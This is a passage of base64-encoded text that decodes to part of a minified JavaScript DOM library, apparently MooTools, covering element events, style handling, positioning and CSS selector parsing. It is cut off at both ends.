M7fWlmKCFBKXtmb3IodmFyIEIgaW4gQyl7dGhpcy5jbG9uZUV2ZW50cyhELEIpO319ZWxzZXtpZihDW0FdKXtDW0FdLmtleXMuZWFjaChmdW5jdGlvbihFKXt0aGlzLmFkZEV2ZW50KEEsRSk7Cn0sdGhpcyk7fX1yZXR1cm4gdGhpczt9fSk7RWxlbWVudC5OYXRpdmVFdmVudHM9e2NsaWNrOjIsZGJsY2xpY2s6Mixtb3VzZXVwOjIsbW91c2Vkb3duOjIsY29udGV4dG1lbnU6Mixtb3VzZXdoZWVsOjIsRE9NTW91c2VTY3JvbGw6Mixtb3VzZW92ZXI6Mixtb3VzZW91dDoyLG1vdXNlbW92ZToyLHNlbGVjdHN0YXJ0OjIsc2VsZWN0ZW5kOjIsa2V5ZG93bjoyLGtleXByZXNzOjIsa2V5dXA6Mixmb2N1czoyLGJsdXI6MixjaGFuZ2U6MixyZXNldDoyLHNlbGVjdDoyLHN1Ym1pdDoyLGxvYWQ6MSx1bmxvYWQ6MSxiZWZvcmV1bmxvYWQ6MixyZXNpemU6MSxtb3ZlOjEsRE9NQ29udGVudExvYWRlZDoxLHJlYWR5c3RhdGVjaGFuZ2U6MSxlcnJvcjoxLGFib3J0OjEsc2Nyb2xsOjF9OwooZnVuY3Rpb24oKXt2YXIgQT1mdW5jdGlvbihCKXt2YXIgQz1CLnJlbGF0ZWRUYXJnZXQ7aWYoQz09dW5kZWZpbmVkKXtyZXR1cm4gdHJ1ZTt9aWYoQz09PWZhbHNlKXtyZXR1cm4gZmFsc2U7fXJldHVybigkdHlwZSh0aGlzKSE9ImRvY3VtZW50IiYmQyE9dGhpcyYmQy5wcmVmaXghPSJ4dWwiJiYhdGhpcy5oYXNDaGlsZChDKSk7Cn07RWxlbWVudC5FdmVudHM9bmV3IEhhc2goe21vdXNlZW50ZXI6e2Jhc2U6Im1vdXNlb3ZlciIsY29uZGl0aW9uOkF9LG1vdXNlbGVhdmU6e2Jhc2U6Im1vdXNlb3V0Iixjb25kaXRpb246QX0sbW91c2V3aGVlbDp7YmFzZTooQnJvd3Nlci5FbmdpbmUuZ2Vja28pPyJET01Nb3VzZVNjcm9sbCI6Im1vdXNld2hlZWwifX0pOwp9KSgpO0VsZW1lbnQuUHJvcGVydGllcy5zdHlsZXM9e3NldDpmdW5jdGlvbihBKXt0aGlzLnNldFN0eWxlcyhBKTt9fTtFbGVtZW50LlByb3BlcnRpZXMub3BhY2l0eT17c2V0OmZ1bmN0aW9uKEEsQil7aWYoIUIpe2lmKEE9PTApe2lmKHRoaXMuc3R5bGUudmlzaWJpbGl0eSE9ImhpZGRlbiIpe3RoaXMuc3R5bGUudmlzaWJpbGl0eT0iaGlkZGVuIjsKfX1lbHNle2lmKHRoaXMuc3R5bGUudmlzaWJpbGl0eSE9InZpc2libGUiKXt0aGlzLnN0eWxlLnZpc2liaWxpdHk9InZpc2libGUiO319fWlmKCF0aGlzLmN1cnJlbnRTdHlsZXx8IXRoaXMuY3VycmVudFN0eWxlLmhhc0xheW91dCl7dGhpcy5zdHlsZS56b29tPTE7fWlmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpe3RoaXMuc3R5bGUuZmlsdGVyPShBPT0xKT8iIjoiYWxwaGEob3BhY2l0eT0iK0EqMTAwKyIpIjsKfXRoaXMuc3R5bGUub3BhY2l0eT1BO3RoaXMuc3RvcmUoIm9wYWNpdHkiLEEpO30sZ2V0OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMucmV0cmlldmUoIm9wYWNpdHkiLDEpO319O0VsZW1lbnQuaW1wbGVtZW50KHtzZXRPcGFjaXR5OmZ1bmN0aW9uKEEpe3JldHVybiB0aGlzLnNldCgib3BhY2l0eSIsQSx0cnVlKTsKfSxnZXRPcGFjaXR5OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuZ2V0KCJvcGFjaXR5Iik7fSxzZXRTdHlsZTpmdW5jdGlvbihCLEEpe3N3aXRjaChCKXtjYXNlIm9wYWNpdHkiOnJldHVybiB0aGlzLnNldCgib3BhY2l0eSIscGFyc2VGbG9hdChBKSk7Y2FzZSJmbG9hdCI6Qj0oQnJvd3Nlci5FbmdpbmUudHJpZGVudCk/InN0eWxlRmxvYXQiOiJjc3NGbG9hdCI7Cn1CPUIuY2FtZWxDYXNlKCk7aWYoJHR5cGUoQSkhPSJzdHJpbmciKXt2YXIgQz0oRWxlbWVudC5TdHlsZXMuZ2V0KEIpfHwiQCIpLnNwbGl0KCIgIik7QT0kc3BsYXQoQSkubWFwKGZ1bmN0aW9uKEUsRCl7aWYoIUNbRF0pe3JldHVybiIiO31yZXR1cm4oJHR5cGUoRSk9PSJudW1iZXIiKT9DW0RdLnJlcGxhY2UoIkAiLE1hdGgucm91bmQoRSkpOkU7Cn0pLmpvaW4oIiAiKTt9ZWxzZXtpZihBPT1TdHJpbmcoTnVtYmVyKEEpKSl7QT1NYXRoLnJvdW5kKEEpO319dGhpcy5zdHlsZVtCXT1BO3JldHVybiB0aGlzO30sZ2V0U3R5bGU6ZnVuY3Rpb24oRyl7c3dpdGNoKEcpe2Nhc2Uib3BhY2l0eSI6cmV0dXJuIHRoaXMuZ2V0KCJvcGFjaXR5Iik7CmNhc2UiZmxvYXQiOkc9KEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpPyJzdHlsZUZsb2F0IjoiY3NzRmxvYXQiO31HPUcuY2FtZWxDYXNlKCk7dmFyIEE9dGhpcy5zdHlsZVtHXTtpZighJGNoayhBKSl7QT1bXTtmb3IodmFyIEYgaW4gRWxlbWVudC5TaG9ydFN0eWxlcyl7aWYoRyE9Ril7Y29udGludWU7Cn1mb3IodmFyIEUgaW4gRWxlbWVudC5TaG9ydFN0eWxlc1tGXSl7QS5wdXNoKHRoaXMuZ2V0U3R5bGUoRSkpO31yZXR1cm4gQS5qb2luKCIgIik7fUE9dGhpcy5nZXRDb21wdXRlZFN0eWxlKEcpO31pZihBKXtBPVN0cmluZyhBKTt2YXIgQz1BLm1hdGNoKC9yZ2JhP1woW1xkXHMsXStcKS8pOwppZihDKXtBPUEucmVwbGFjZShDWzBdLENbMF0ucmdiVG9IZXgoKSk7fX1pZihCcm93c2VyLkVuZ2luZS5wcmVzdG98fChCcm93c2VyLkVuZ2luZS50cmlkZW50JiYhJGNoayhwYXJzZUludChBKSkpKXtpZihHLnRlc3QoL14oaGVpZ2h0fHdpZHRoKSQvKSl7dmFyIEI9KEc9PSJ3aWR0aCIpP1sibGVmdCIsInJpZ2h0Il06WyJ0b3AiLCJib3R0b20iXSxEPTA7CkIuZWFjaChmdW5jdGlvbihIKXtEKz10aGlzLmdldFN0eWxlKCJib3JkZXItIitIKyItd2lkdGgiKS50b0ludCgpK3RoaXMuZ2V0U3R5bGUoInBhZGRpbmctIitIKS50b0ludCgpO30sdGhpcyk7cmV0dXJuIHRoaXNbIm9mZnNldCIrRy5jYXBpdGFsaXplKCldLUQrInB4IjsKfWlmKEJyb3dzZXIuRW5naW5lLnByZXN0byYmU3RyaW5nKEEpLnRlc3QoInB4Iikpe3JldHVybiBBO31pZihHLnRlc3QoLyhib3JkZXIoLispV2lkdGh8bWFyZ2lufHBhZGRpbmcpLykpe3JldHVybiIwcHgiO319cmV0dXJuIEE7fSxzZXRTdHlsZXM6ZnVuY3Rpb24oQil7Zm9yKHZhciBBIGluIEIpe3RoaXMuc2V0U3R5bGUoQSxCW0FdKTsKfXJldHVybiB0aGlzO30sZ2V0U3R5bGVzOmZ1bmN0aW9uKCl7dmFyIEE9e307QXJyYXkuZWFjaChhcmd1bWVudHMsZnVuY3Rpb24oQil7QVtCXT10aGlzLmdldFN0eWxlKEIpO30sdGhpcyk7cmV0dXJuIEE7fX0pO0VsZW1lbnQuU3R5bGVzPW5ldyBIYXNoKHtsZWZ0OiJAcHgiLHRvcDoiQHB4Iixib3R0b206IkBweCIscmlnaHQ6IkBweCIsd2lkdGg6IkBweCIsaGVpZ2h0OiJAcHgiLG1heFdpZHRoOiJAcHgiLG1heEhlaWdodDoiQHB4IixtaW5XaWR0aDoiQHB4IixtaW5IZWlnaHQ6IkBweCIsYmFja2dyb3VuZENvbG9yOiJyZ2IoQCwgQCwgQCkiLGJhY2tncm91bmRQb3NpdGlvbjoiQHB4IEBweCIsY29sb3I6InJnYihALCBALCBAKSIsZm9udFNpemU6IkBweCIsbGV0dGVyU3BhY2luZzoiQHB4IixsaW5lSGVpZ2h0OiJAcHgiLGNsaXA6InJlY3QoQHB4IEBweCBAcHggQHB4KSIsbWFyZ2luOiJAcHggQHB4IEBweCBAcHgiLHBhZGRpbmc6IkBweCBAcHggQHB4IEBweCIsYm9yZGVyOiJAcHggQCByZ2IoQCwgQCwgQCkgQHB4IEAgcmdiKEAsIEAsIEApIEBweCBAIHJnYihALCBALCBAKSIsYm9yZGVyV2lkdGg6IkBweCBAcHggQHB4IEBweCIsYm9yZGVyU3R5bGU6IkAgQCBAIEAiLGJvcmRlckNvbG9yOiJyZ2IoQCwgQCwgQCkgcmdiKEAsIEAsIEApIHJnYihALCBALCBAKSByZ2IoQCwgQCwgQCkiLHpJbmRleDoiQCIsem9vbToiQCIsZm9udFdlaWdodDoiQCIsdGV4dEluZGVudDoiQHB4IixvcGFjaXR5OiJAIn0pOwpFbGVtZW50LlNob3J0U3R5bGVzPXttYXJnaW46e30scGFkZGluZzp7fSxib3JkZXI6e30sYm9yZGVyV2lkdGg6e30sYm9yZGVyU3R5bGU6e30sYm9yZGVyQ29sb3I6e319O1siVG9wIiwiUmlnaHQiLCJCb3R0b20iLCJMZWZ0Il0uZWFjaChmdW5jdGlvbihHKXt2YXIgRj1FbGVtZW50LlNob3J0U3R5bGVzOwp2YXIgQj1FbGVtZW50LlN0eWxlcztbIm1hcmdpbiIsInBhZGRpbmciXS5lYWNoKGZ1bmN0aW9uKEgpe3ZhciBJPUgrRztGW0hdW0ldPUJbSV09IkBweCI7fSk7dmFyIEU9ImJvcmRlciIrRztGLmJvcmRlcltFXT1CW0VdPSJAcHggQCByZ2IoQCwgQCwgQCkiO3ZhciBEPUUrIldpZHRoIixBPUUrIlN0eWxlIixDPUUrIkNvbG9yIjsKRltFXT17fTtGLmJvcmRlcldpZHRoW0RdPUZbRV1bRF09QltEXT0iQHB4IjtGLmJvcmRlclN0eWxlW0FdPUZbRV1bQV09QltBXT0iQCI7Ri5ib3JkZXJDb2xvcltDXT1GW0VdW0NdPUJbQ109InJnYihALCBALCBAKSI7fSk7KGZ1bmN0aW9uKCl7RWxlbWVudC5pbXBsZW1lbnQoe3Njcm9sbFRvOmZ1bmN0aW9uKEgsSSl7aWYoQih0aGlzKSl7dGhpcy5nZXRXaW5kb3coKS5zY3JvbGxUbyhILEkpOwp9ZWxzZXt0aGlzLnNjcm9sbExlZnQ9SDt0aGlzLnNjcm9sbFRvcD1JO31yZXR1cm4gdGhpczt9LGdldFNpemU6ZnVuY3Rpb24oKXtpZihCKHRoaXMpKXtyZXR1cm4gdGhpcy5nZXRXaW5kb3coKS5nZXRTaXplKCk7fXJldHVybnt4OnRoaXMub2Zmc2V0V2lkdGgseTp0aGlzLm9mZnNldEhlaWdodH07Cn0sZ2V0U2Nyb2xsU2l6ZTpmdW5jdGlvbigpe2lmKEIodGhpcykpe3JldHVybiB0aGlzLmdldFdpbmRvdygpLmdldFNjcm9sbFNpemUoKTt9cmV0dXJue3g6dGhpcy5zY3JvbGxXaWR0aCx5OnRoaXMuc2Nyb2xsSGVpZ2h0fTt9LGdldFNjcm9sbDpmdW5jdGlvbigpe2lmKEIodGhpcykpe3JldHVybiB0aGlzLmdldFdpbmRvdygpLmdldFNjcm9sbCgpOwp9cmV0dXJue3g6dGhpcy5zY3JvbGxMZWZ0LHk6dGhpcy5zY3JvbGxUb3B9O30sZ2V0U2Nyb2xsczpmdW5jdGlvbigpe3ZhciBJPXRoaXMsSD17eDowLHk6MH07d2hpbGUoSSYmIUIoSSkpe0gueCs9SS5zY3JvbGxMZWZ0O0gueSs9SS5zY3JvbGxUb3A7ST1JLnBhcmVudE5vZGU7Cn1yZXR1cm4gSDt9LGdldE9mZnNldFBhcmVudDpmdW5jdGlvbigpe3ZhciBIPXRoaXM7aWYoQihIKSl7cmV0dXJuIG51bGw7fWlmKCFCcm93c2VyLkVuZ2luZS50cmlkZW50KXtyZXR1cm4gSC5vZmZzZXRQYXJlbnQ7fXdoaWxlKChIPUgucGFyZW50Tm9kZSkmJiFCKEgpKXtpZihEKEgsInBvc2l0aW9uIikhPSJzdGF0aWMiKXtyZXR1cm4gSDsKfX1yZXR1cm4gbnVsbDt9LGdldE9mZnNldHM6ZnVuY3Rpb24oKXt2YXIgST10aGlzLEg9e3g6MCx5OjB9O2lmKEIodGhpcykpe3JldHVybiBIO313aGlsZShJJiYhQihJKSl7SC54Kz1JLm9mZnNldExlZnQ7SC55Kz1JLm9mZnNldFRvcDtpZihCcm93c2VyLkVuZ2luZS5nZWNrbyl7aWYoIUYoSSkpe0gueCs9QyhJKTsKSC55Kz1HKEkpO312YXIgSj1JLnBhcmVudE5vZGU7aWYoSiYmRChKLCJvdmVyZmxvdyIpIT0idmlzaWJsZSIpe0gueCs9QyhKKTtILnkrPUcoSik7fX1lbHNle2lmKEkhPXRoaXMmJihCcm93c2VyLkVuZ2luZS50cmlkZW50fHxCcm93c2VyLkVuZ2luZS53ZWJraXQpKXtILngrPUMoSSk7CkgueSs9RyhJKTt9fUk9SS5vZmZzZXRQYXJlbnQ7aWYoQnJvd3Nlci5FbmdpbmUudHJpZGVudCl7d2hpbGUoSSYmIUkuY3VycmVudFN0eWxlLmhhc0xheW91dCl7ST1JLm9mZnNldFBhcmVudDt9fX1pZihCcm93c2VyLkVuZ2luZS5nZWNrbyYmIUYodGhpcykpe0gueC09Qyh0aGlzKTsKSC55LT1HKHRoaXMpO31yZXR1cm4gSDt9LGdldFBvc2l0aW9uOmZ1bmN0aW9uKEspe2lmKEIodGhpcykpe3JldHVybnt4OjAseTowfTt9dmFyIEw9dGhpcy5nZXRPZmZzZXRzKCksST10aGlzLmdldFNjcm9sbHMoKTt2YXIgSD17eDpMLngtSS54LHk6TC55LUkueX07dmFyIEo9KEsmJihLPSQoSykpKT9LLmdldFBvc2l0aW9uKCk6e3g6MCx5OjB9OwpyZXR1cm57eDpILngtSi54LHk6SC55LUoueX07fSxnZXRDb29yZGluYXRlczpmdW5jdGlvbihKKXtpZihCKHRoaXMpKXtyZXR1cm4gdGhpcy5nZXRXaW5kb3coKS5nZXRDb29yZGluYXRlcygpO312YXIgSD10aGlzLmdldFBvc2l0aW9uKEopLEk9dGhpcy5nZXRTaXplKCk7CnZhciBLPXtsZWZ0OkgueCx0b3A6SC55LHdpZHRoOkkueCxoZWlnaHQ6SS55fTtLLnJpZ2h0PUsubGVmdCtLLndpZHRoO0suYm90dG9tPUsudG9wK0suaGVpZ2h0O3JldHVybiBLO30sY29tcHV0ZVBvc2l0aW9uOmZ1bmN0aW9uKEgpe3JldHVybntsZWZ0OkgueC1FKHRoaXMsIm1hcmdpbi1sZWZ0IiksdG9wOkgueS1FKHRoaXMsIm1hcmdpbi10b3AiKX07Cn0scG9zaXRpb246ZnVuY3Rpb24oSCl7cmV0dXJuIHRoaXMuc2V0U3R5bGVzKHRoaXMuY29tcHV0ZVBvc2l0aW9uKEgpKTt9fSk7TmF0aXZlLmltcGxlbWVudChbRG9jdW1lbnQsV2luZG93XSx7Z2V0U2l6ZTpmdW5jdGlvbigpe3ZhciBJPXRoaXMuZ2V0V2luZG93KCk7CmlmKEJyb3dzZXIuRW5naW5lLnByZXN0b3x8QnJvd3Nlci5FbmdpbmUud2Via2l0KXtyZXR1cm57eDpJLmlubmVyV2lkdGgseTpJLmlubmVySGVpZ2h0fTt9dmFyIEg9QSh0aGlzKTtyZXR1cm57eDpILmNsaWVudFdpZHRoLHk6SC5jbGllbnRIZWlnaHR9O30sZ2V0U2Nyb2xsOmZ1bmN0aW9uKCl7dmFyIEk9dGhpcy5nZXRXaW5kb3coKTsKdmFyIEg9QSh0aGlzKTtyZXR1cm57eDpJLnBhZ2VYT2Zmc2V0fHxILnNjcm9sbExlZnQseTpJLnBhZ2VZT2Zmc2V0fHxILnNjcm9sbFRvcH07fSxnZXRTY3JvbGxTaXplOmZ1bmN0aW9uKCl7dmFyIEk9QSh0aGlzKTt2YXIgSD10aGlzLmdldFNpemUoKTtyZXR1cm57eDpNYXRoLm1heChJLnNjcm9sbFdpZHRoLEgueCkseTpNYXRoLm1heChJLnNjcm9sbEhlaWdodCxILnkpfTsKfSxnZXRQb3NpdGlvbjpmdW5jdGlvbigpe3JldHVybnt4OjAseTowfTt9LGdldENvb3JkaW5hdGVzOmZ1bmN0aW9uKCl7dmFyIEg9dGhpcy5nZXRTaXplKCk7cmV0dXJue3RvcDowLGxlZnQ6MCxib3R0b206SC55LHJpZ2h0OkgueCxoZWlnaHQ6SC55LHdpZHRoOkgueH07Cn19KTt2YXIgRD1FbGVtZW50LmdldENvbXB1dGVkU3R5bGU7ZnVuY3Rpb24gRShILEkpe3JldHVybiBEKEgsSSkudG9JbnQoKXx8MDt9ZnVuY3Rpb24gRihIKXtyZXR1cm4gRChILCItbW96LWJveC1zaXppbmciKT09ImJvcmRlci1ib3giO31mdW5jdGlvbiBHKEgpe3JldHVybiBFKEgsImJvcmRlci10b3Atd2lkdGgiKTsKfWZ1bmN0aW9uIEMoSCl7cmV0dXJuIEUoSCwiYm9yZGVyLWxlZnQtd2lkdGgiKTt9ZnVuY3Rpb24gQihIKXtyZXR1cm4oL14oPzpib2R5fGh0bWwpJC9pKS50ZXN0KEgudGFnTmFtZSk7fWZ1bmN0aW9uIEEoSCl7dmFyIEk9SC5nZXREb2N1bWVudCgpO3JldHVybighSS5jb21wYXRNb2RlfHxJLmNvbXBhdE1vZGU9PSJDU1MxQ29tcGF0Iik/SS5odG1sOkkuYm9keTsKfX0pKCk7TmF0aXZlLmltcGxlbWVudChbV2luZG93LERvY3VtZW50LEVsZW1lbnRdLHtnZXRIZWlnaHQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5nZXRTaXplKCkueTt9LGdldFdpZHRoOmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuZ2V0U2l6ZSgpLng7fSxnZXRTY3JvbGxUb3A6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5nZXRTY3JvbGwoKS55Owp9LGdldFNjcm9sbExlZnQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5nZXRTY3JvbGwoKS54O30sZ2V0U2Nyb2xsSGVpZ2h0OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuZ2V0U2Nyb2xsU2l6ZSgpLnk7fSxnZXRTY3JvbGxXaWR0aDpmdW5jdGlvbigpe3JldHVybiB0aGlzLmdldFNjcm9sbFNpemUoKS54Owp9LGdldFRvcDpmdW5jdGlvbigpe3JldHVybiB0aGlzLmdldFBvc2l0aW9uKCkueTt9LGdldExlZnQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5nZXRQb3NpdGlvbigpLng7fX0pO05hdGl2ZS5pbXBsZW1lbnQoW0RvY3VtZW50LEVsZW1lbnRdLHtnZXRFbGVtZW50czpmdW5jdGlvbihILEcpe0g9SC5zcGxpdCgiLCIpOwp2YXIgQyxFPXt9O2Zvcih2YXIgRD0wLEI9SC5sZW5ndGg7RDxCO0QrKyl7dmFyIEE9SFtEXSxGPVNlbGVjdG9ycy5VdGlscy5zZWFyY2godGhpcyxBLEUpO2lmKEQhPTAmJkYuaXRlbSl7Rj0kQShGKTt9Qz0oRD09MCk/RjooQy5pdGVtKT8kQShDKS5jb25jYXQoRik6Qy5jb25jYXQoRik7Cn1yZXR1cm4gbmV3IEVsZW1lbnRzKEMse2RkdXA6KEgubGVuZ3RoPjEpLGNhc2g6IUd9KTt9fSk7RWxlbWVudC5pbXBsZW1lbnQoe21hdGNoOmZ1bmN0aW9uKEIpe2lmKCFCKXtyZXR1cm4gdHJ1ZTt9dmFyIEQ9U2VsZWN0b3JzLlV0aWxzLnBhcnNlVGFnQW5kSUQoQik7CnZhciBBPURbMF0sRT1EWzFdO2lmKCFTZWxlY3RvcnMuRmlsdGVycy5ieUlEKHRoaXMsRSl8fCFTZWxlY3RvcnMuRmlsdGVycy5ieVRhZyh0aGlzLEEpKXtyZXR1cm4gZmFsc2U7fXZhciBDPVNlbGVjdG9ycy5VdGlscy5wYXJzZVNlbGVjdG9yKEIpO3JldHVybihDKT9TZWxlY3RvcnMuVXRpbHMuZmlsdGVyKHRoaXMsQyx7fSk6dHJ1ZTsKfX0pO3ZhciBTZWxlY3RvcnM9e0NhY2hlOntudGg6e30scGFyc2VkOnt9fX07U2VsZWN0b3JzLlJlZ0V4cHM9e2lkOigvIyhbXHctXSspLyksdGFnOigvXihcdyt8XCopLykscXVpY2s6KC9eKFx3K3xcKikkLyksc3BsaXR0ZXI6KC9ccyooWys+flxzXSlccyooW2EtekEtWiMuKjpcW10pL2cpLGNvbWJpbmVkOigvXC4oW1x3LV0rKXxcWyhcdyspKD86KFshKl4kfnxdPz0pWyInXT8oLio/KVsiJ10/KT9cXXw6KFtcdy1dKykoPzpcKFsiJ10/KC4qPyk/WyInXT9cKXwkKS9nKX07ClNlbGVjdG9ycy5VdGlscz17Y2hrOmZ1bmN0aW9uKEIsQyl7aWYoIUMpe3JldHVybiB0cnVlO312YXIgQT0kdWlkKEIpO2lmKCFDW0FdKXtyZXR1cm4gQ1tBXT10cnVlO31yZXR1cm4gZmFsc2U7fSxwYXJzZU50aEFyZ3VtZW50OmZ1bmN0aW9uKEYpe2lmKFNlbGVjdG9ycy5DYWNoZS5udGhbRl0pe3JldHVybiBTZWxlY3RvcnMuQ2FjaGUubnRoW0ZdOwp9dmFyIEM9Ri5tYXRjaCgvXihbKy1dP1xkKik/KFthLXpdKyk/KFsrLV0/XGQqKT8kLyk7aWYoIUMpe3JldHVybiBmYWxzZTt9dmFyIEU9cGFyc2VJbnQoQ1sxXSk7dmFyIEI9KEV8fEU9PT0wKT9FOjE7dmFyIEQ9Q1syXXx8ZmFsc2U7dmFyIEE9cGFyc2VJbnQoQ1szXSl8fDA7CmlmKEIhPTApe0EtLTt3aGlsZShBPDEpe0ErPUI7fXdoaWxlKEE+PUIpe0EtPUI7fX1lbHNle0I9QTtEPSJpbmRleCI7fXN3aXRjaChEKXtjYXNlIm4iOkM9e2E6QixiOkEsc3BlY2lhbDoibiJ9O2JyZWFrO2Nhc2Uib2RkIjpDPXthOjIsYjowLHNwZWNpYWw6Im4ifTsKYnJlYWs7Y2FzZSJldmVuIjpDPXthOjIsYjoxLHNwZWNpYWw6Im4ifTticmVhaztjYXNlImZpcnN0IjpDPXthOjAsc3BlY2lhbDoiaW5kZXgifTticmVhaztjYXNlImxhc3QiOkM9e3NwZWNpYWw6Imxhc3QtY2hpbGQifTticmVhaztjYXNlIm9ubHkiOkM9e3NwZWNpYWw6Im9ubHktY2hpbGQifTsKYnJlYWs7ZGVmYXVsdDpDPXthOihCLTEpLHNwZWNpYWw6ImluZGV4In07fXJldHVybiBTZWxlY3RvcnMuQ2FjaGUubnRoW0ZdPUM7fSxwYXJzZVNlbGVjdG9yOmZ1bmN0aW9uKEUpe2lmKFNlbGVjdG9ycy5DYWNoZS5wYXJzZWRbRV0pe3JldHVybiBTZWxlY3RvcnMuQ2FjaGUucGFyc2VkW0VdOwp9dmFyIEQsSD17Y2xhc3NlczpbXSxwc2V1ZG9zOltdLGF0dHJpYnV0ZXM6W119O3doaWxlKChEPVNlbGVjdG9ycy5SZWdFeHBzLmNvbWJpbmVkLmV4ZWMoRSkpKXt2YXIgST1EWzFdLEc9RFsyXSxGPURbM10sQj1EWzRdLEM9RFs1XSxKPURbNl07aWYoSSl7SC5jbGFzc2VzLnB1c2goSSk7Cn1lbHNle2lmKEMpe3ZhciBBPVNlbGVjdG9ycy5Qc2V1ZG8uZ2V0KEMpO2lmKEEpe0gucHNldWRvcy5wdXNoKHtwYXJzZXI6QSxhcmd1bWVudDpKfSk7fWVsc2V7SC5hdHRyaWJ1dGVzLnB1c2goe25hbWU6QyxvcGVyYXRvcjoiPSIsdmFsdWU6Sn0pO319ZWxzZXtpZihHKXtILmF0dHJpYnV0ZXMucHVzaCh7bmFtZTpHLG9wZXJhdG9yOkYsdmFsdWU6Qn0pOwp9fX19aWYoIUguY2xhc3Nlcy5sZW5ndGgpe2RlbGV0ZSBILmNsYXNzZXM7fWlmKCFILmF0dHJpYnV0ZXMubGVuZ3RoKXtkZWxldGUgSC5hdHRyaWJ1dGVzO31pZighSC5wc2V1ZG9zLmxlbmd0aCl7ZGVsZXRlIEgucHNldWRvczt9aWYoIUguY2xhc3NlcyYmIUguYXR0cmlidXRlcyYmIUgucHNldWRvcyl7SD1udWxsOwp9cmV0dXJuIFNlbGVjdG9ycy5DYWNoZS5wYXJzZWRbRV09SDt9LHBhcnNlVGFnQW5kSUQ6ZnVuY3Rpb24oQil7dmFyIEE9Qi5tYXRjaChTZWxlY3RvcnMuUmVnRXhwcy50YWcpO3ZhciBDPUIubWF0Y2goU2VsZWN0b3JzLlJlZ0V4cHMuaWQpO3JldHVyblsoQSk/QVsxXToiKiIsKEMpP0NbMV06ZmFsc2VdOwp9LGZpbHRlcjpmdW5jdGlvbihGLEMsRSl7dmFyIEQ7aWYoQy5jbGFzc2VzKXtmb3IoRD1DLmNsYXNzZXMubGVuZ3RoO0QtLTtEKXt2YXIgRz1DLmNsYXNzZXNbRF07aWYoIVNlbGVjdG9ycy5GaWx0ZXJzLmJ5Q2xhc3MoRixHKSl7cmV0dXJuIGZhbHNlO319fWlmKEMuYXR0cmlidXRlcyl7Zm9yKEQ9Qy5hdHRyaWJ1dGVzLmxlbmd0aDsKRC0tO0Qpe3ZhciBCPUMuYXR0cmlidXRlc1tEXTtpZighU2VsZWN0b3JzLkZpbHRlcnMuYnlBdHRyaWJ1dGUoRixCLm5hbWUsQi5vcGVyYXRvcixCLnZhbHVlKSl7cmV0dXJuIGZhbHNlO319fWlmKEMucHNldWRvcyl7Zm9yKEQ9Qy5wc2V1ZG9zLmxlbmd0aDtELS07RCl7dmFyIEE9Qy5wc2V1ZG9zW0RdOwppZighU2VsZWN0b3JzLkZpbHRlcnMuYnlQc2V1ZG8oRixBLnBhcnNlcixBLmFyZ3VtZW50LEUpKXtyZXR1cm4gZmFsc2U7fX19cmV0dXJuIHRydWU7fSxnZXRCeVRhZ0FuZElEOmZ1bmN0aW9uKEIsQSxEKXtpZihEKXt2YXIgQz0oQi5nZXRFbGVtZW50QnlJZCk/Qi5nZXRFbGVtZW50QnlJZChELHRydWUpOkVsZW1lbnQuZ2V0RWxlbWVudEJ5SWQoQixELHRydWUpOwpyZXR1cm4oQyYmU2VsZWN0b3JzLkZpbHRlcnMuYnlUYWcoQyxBKSk/W0NdOltdO31lbHNle3JldHVybiBCLmdldEVsZW1lbnRzQnlUYWdOYW1lKEEpO319LHNlYXJjaDpmdW5jdGlvbihKLEksTyl7dmFyIEI9W107dmFyIEM9SS50cmltKCkucmVwbGFjZShTZWxlY3RvcnMuUmVnRXhwcy5zcGxpdHRlcixmdW5jdGlvbihaLFksWCl7Qi5wdXNoKFkpOwpyZXR1cm4iOikiK1g7fSkuc3BsaXQoIjopIik7dmFyIEssRixFLFY7Zm9yKHZhciBVPTAsUT1DLmxlbmd0aDtVPFE7VSsrKXt2YXIgVD1DW1VdO2lmKFU9PTAmJlNlbGVjdG9ycy5SZWdFeHBzLnF1aWNrLnRlc3QoVCkpe0s9Si5nZXRFbGVtZW50c0J5VGFnTmFtZShUKTsKY29udGludWU7fXZhciBBPUJbVS0xXTt2YXIgTD1TZWxlY3RvcnMuVXRpbHMucGFyc2VUYWdBbmRJRChUKTt2YXIgVz1MWzBdLE09TFsxXTtpZihVPT0wKXtLPVNlbGVjdG9ycy5VdGlscy5nZXRCeVRhZ0FuZElEKEosVyxNKTt9ZWxzZXt2YXIgRD17fSxIPVtdO2Zvcih2YXIgUz0wLFI9Sy5sZW5ndGg7ClM8UjtTKyspe0g9U2VsZWN0b3JzLkdldHRlcnNbQV0oSCxLW1NdLFcsTSxEKTt9Sz1IO312YXIgRz1TZWxlY3RvcnMuVXRpbHMucGFyc2VTZWxlY3RvcihUKTtpZihHKXtFPVtdO2Zvcih2YXIgUD0wLE49Sy5sZW5ndGg7UDxOO1ArKyl7Vj1LW1BdO2lmKFNlbGVjdG9ycy5VdGlscy5maWx0ZXIoVixHLE8pKXtFLnB1c2goVik7Cn19Sz1FO319cmV0dXJuIEs7fX07U2VsZWN0b3JzLkdldHRlcnM9eyIgIjpmdW5jdGlvbihILEcsSSxBLEUpe3ZhciBEPVNlbGVjdG9ycy5VdGlscy5nZXRCeVRhZ0FuZElEKEcsSSxBKTtmb3IodmFyIEM9MCxCPUQubGVuZ3RoO0M8QjtDKyspe3ZhciBGPURbQ107aWYoU2VsZWN0b3JzLlV0aWxzLmNoayhGLEUpKXtILnB1c2goRik7Cn19cmV0dXJuIEg7fSwiPiI6ZnVuY3Rpb24oSCxHLEksQSxGKXt2YXIgQz1TZWxlY3RvcnMuVXRpbHMuZ2V0QnlUYWdBbmRJRChHLEksQSk7Zm9yKHZhciBFPTAsRD1DLmxlbmd0aDtFPEQ7RSsrKXt2YXIgQj1DW0VdO2lmKEIucGFyZW50Tm9kZT09RyYmU2VsZWN0b3JzLlV0aWxzLmNoayhCLEYpKXtILnB1c2goQik7Cn19cmV0dXJuIEg7fSwiKyI6ZnVuY3Rpb24oQyxCLEEsRSxEKXt3aGlsZSgoQj1CLm5leHRTaWJsaW5nKSl7aWYoQi5ub2RlVHlwZT09MSl7aWYoU2VsZWN0b3JzLlV0aWx